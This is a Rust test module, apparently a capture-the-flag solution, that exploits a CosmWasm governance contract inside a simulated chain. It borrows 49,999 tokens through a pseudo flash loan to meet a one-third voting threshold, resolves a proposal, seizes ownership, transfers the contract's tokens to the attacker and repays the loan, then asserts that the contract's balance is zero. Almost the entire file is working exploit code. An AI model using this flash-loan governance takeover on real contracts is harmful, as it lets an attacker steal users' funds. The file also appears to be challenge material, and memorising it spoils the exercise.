#[cfg(test)]
pub mod exploit {
    use crate::{
        integration_tests::tests::{
            base_scenario, pseudo_flash_loan, ExecuteMsgs, ADMIN, PLAYER, VOTING_WINDOW,
        },
        msg::{ExecuteMsg, QueryMsg},
        state::Config,
    };
    use cosmwasm_std::{to_binary, Addr, CosmosMsg, Uint128, WasmMsg};
    use cw20::Cw20ExecuteMsg;
    use cw_multi_test::Executor;

    #[test]
    fn exploit() {
        let (mut app, contract_addr, token_addr) = base_scenario();

        let player = Addr::unchecked(PLAYER);

        app.execute_contract(
            player.clone(),
            contract_addr.clone(),
            &ExecuteMsg::Propose {},
            &[],
        )
        .unwrap();

        app.update_block(|block| block.time = block.time.plus_seconds(VOTING_WINDOW));

        // balance.balance >= (vtoken_info.total_supply / Uint128::from(3u32))
        // 49_999 >= 149_999 / 3
        let amount = Uint128::new(49_999);

        app = pseudo_flash_loan(
            app,
            token_addr.clone(),
            amount,
            player.to_string(),
            vec![
                (
                    token_addr.clone(),
                    ExecuteMsgs::Cw20ExecuteMsg(Cw20ExecuteMsg::Transfer {
                        recipient: contract_addr.to_string(),
                        amount,
                    }),
                ),
                (
                    contract_addr.clone(),
                    ExecuteMsgs::ExecuteMsg(ExecuteMsg::ResolveProposal {}),
                ),
                (
                    contract_addr.clone(),
                    ExecuteMsgs::ExecuteMsg(ExecuteMsg::OwnerAction {
                        action: CosmosMsg::Wasm(WasmMsg::Execute {
                            contract_addr: token_addr.to_string(),
                            msg: to_binary(&Cw20ExecuteMsg::Transfer {
                                recipient: player.to_string(),
                                amount,
                            })
                            .unwrap(),
                            funds: vec![],
                        }),
                    }),
                ),
                (
                    token_addr.clone(),
                    ExecuteMsgs::Cw20ExecuteMsg(Cw20ExecuteMsg::IncreaseAllowance {
                        spender: ADMIN.to_string(),
                        amount,
                        expires: None,
                    }),
                ),
            ],
        );

        let config: Config = app
            .wrap()
            .query_wasm_smart(contract_addr.clone(), &QueryMsg::Config {})
            .unwrap();
        assert_eq!(config.owner, player);

        let balance: Uint128 = app
            .wrap()
            .query_wasm_smart(contract_addr, &QueryMsg::Balance {})
            .unwrap();
        assert_eq!(balance, Uint128::zero());
    }
}
